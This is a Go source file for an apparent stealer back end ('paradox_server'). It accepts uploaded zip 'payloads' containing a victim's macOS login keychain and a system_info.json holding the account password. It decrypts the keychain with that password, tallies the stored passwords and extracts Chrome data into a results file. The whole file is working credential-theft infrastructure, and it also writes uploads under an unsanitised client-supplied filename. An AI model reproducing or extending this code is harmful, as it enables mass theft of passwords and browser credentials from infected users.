package handlers

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"paradox_server/decode"
	"paradox_server/extract"
	"paradox_server/fileops"
	"paradox_server/models"
	"path/filepath"

	"github.com/gin-gonic/gin"
)

func HandleUpload(c *gin.Context) {
	file, err := c.FormFile("payload")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to get file from form: " + err.Error()})
		return
	}

	baseLogDir := "./log-directory"
	if err := os.MkdirAll(baseLogDir, 0755); err != nil {
		log.Printf("Error creating base log directory %s: %v", baseLogDir, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create base log directory: " + err.Error()})
		return
	}

	tempDir, err := os.MkdirTemp(baseLogDir, "upload-*")
	if err != nil {
		log.Printf("Error creating temp directory in %s: %v", baseLogDir, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temp directory: " + err.Error()})
		return
	}

	zipPath := filepath.Join(tempDir, file.Filename)
	if err := c.SaveUploadedFile(file, zipPath); err != nil {
		log.Printf("Error saving uploaded file to %s: %v", zipPath, err)
		os.RemoveAll(tempDir)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save uploaded file: " + err.Error()})
		return
	}

	fmt.Printf("Received file: %s, saved to: %s. Starting background processing.\n", file.Filename, zipPath)

	c.JSON(http.StatusAccepted, gin.H{
		"message":  "Payload received successfully. Processing started in background.",
		"tempPath": tempDir,
	})

	go processPayloadAsync(zipPath, tempDir)
}

func processPayloadAsync(zipPath, tempDir string) {

	defer os.RemoveAll(tempDir)
	log.Printf("Background processing started for: %s in %s\n", zipPath, tempDir)

	extractDir := filepath.Join(tempDir, "extracted")
	if err := fileops.Unzip(zipPath, extractDir); err != nil {
		log.Printf("Error unzipping file %s to %s: %v\n", zipPath, extractDir, err)
		return
	}
	log.Printf("Unzipped content to: %s\n", extractDir)

	keychainDbName := "login.keychain-db"
	systemInfoName := "system_info.json"

	keychainPath, err := fileops.FindFile(extractDir, keychainDbName)
	if err != nil {
		log.Printf("Error finding keychain file '%s' in %s: %v\n", keychainDbName, extractDir, err)
		return
	}
	log.Printf("Found keychain: %s\n", keychainPath)

	systemInfoPath, err := fileops.FindFile(extractDir, systemInfoName)
	if err != nil {
		log.Printf("Error finding system info file '%s' in %s: %v\n", systemInfoName, extractDir, err)
		return
	}
	log.Printf("Found system info: %s\n", systemInfoPath)

	systemInfoData, err := os.ReadFile(systemInfoPath)
	if err != nil {
		log.Printf("Error reading system_info.json %s: %v\n", systemInfoPath, err)
		return
	}

	var sysInfo models.SystemInfo
	if err := json.Unmarshal(systemInfoData, &sysInfo); err != nil {
		log.Printf("Error parsing system_info.json %s: %v\n", systemInfoPath, err)
		return
	}

	if sysInfo.SystemPassword == "" {
		log.Printf("Error: 'system_password' not found or empty in %s\n", systemInfoPath)
		return
	}
	log.Println("Extracted system password.")

	var keychain models.DecryptedKeychain
	keychain, err = decode.DecodeKeychain(keychainPath, sysInfo.SystemPassword)
	if err != nil {
		log.Printf("Error decoding keychain file %s: %v\n", keychainPath, err)
		return
	}
	log.Printf("Decoded keychain: %d password hashes, %d generic passwords, %d internet passwords\n",
		len(keychain.KeychainPasswordHash),
		len(keychain.GenericPasswords),
		len(keychain.InternetPasswords),
	)

	extractionResults, err := extract.ExtractChrome(keychain, sysInfo, extractDir, zipPath)
	if err != nil {
		log.Printf("Error extracting chrome data: %v\n", err)
		return
	}

	jsonResults, err := json.Marshal(extractionResults)
	if err != nil {
		log.Printf("Error marshalling extraction results: %v\n", err)
		return
	}

	resultsPath := filepath.Join(tempDir, "extracted", "results.json")
	if err := os.WriteFile(resultsPath, jsonResults, 0644); err != nil {
		log.Printf("Error writing results to %s: %v\n", resultsPath, err)
		return
	}

	log.Printf("Background processing finished for: %s\n", zipPath)
}
